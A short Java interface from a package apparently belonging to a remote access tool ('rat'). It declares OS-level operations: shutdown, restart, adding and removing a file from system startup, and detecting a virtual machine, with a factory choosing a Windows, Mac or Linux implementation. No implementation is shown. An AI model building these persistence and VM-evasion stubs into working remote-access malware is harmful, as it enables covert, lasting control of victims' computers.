/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.service;

import java.nio.file.Path;

public interface IOperatingSystemService {
	
	void shutDown();
	
	void restart();
	
	void addToStartup(final Path file);
	
	void removeFromStartup(final String name);
	
	boolean isVm();
	
	public static IOperatingSystemService getInstance() {
		final String os = System.getProperty("os.name").toUpperCase();
		
		if (os.contains("WINDOWS")) {
			return new WindowsService();
		} else if (os.contains("MAC")) {
			return new MacService();
		} else if (os.contains("NIX") || os.contains("NUX") || os.contains("AIX")) {
			return new LinuxService();
		}
		
		return null;
	}
	
}
